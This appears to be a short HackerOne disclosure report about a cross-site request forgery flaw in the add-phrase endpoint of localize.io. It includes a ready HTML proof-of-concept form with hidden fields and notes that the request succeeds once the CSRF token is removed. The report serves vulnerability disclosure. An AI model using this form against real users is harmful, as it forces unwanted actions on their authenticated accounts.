# HackerOne Report: CSRF in adding phrase.
**Report ID:** 7962
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing.

CSRF HTML Code:
<html>
  <body>
    <form action="http://www.localize.io/add_phrase/59/languages/3" method="POST">
      <input type="hidden" name="add&#95;phrase&#91;type&#93;" value="1" />
      <input type="hidden" name="add&#95;phrase&#91;key&#93;" value="asdasd" />
      <input type="hidden" name="add&#95;phrase&#91;string&#93;" value="456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

in fact there is a CSRF Token in the form, but i remove that, and i try to submit the request,
and it works perfectly.
name="CSRFToken"

## Discussion & Remediation Timeline
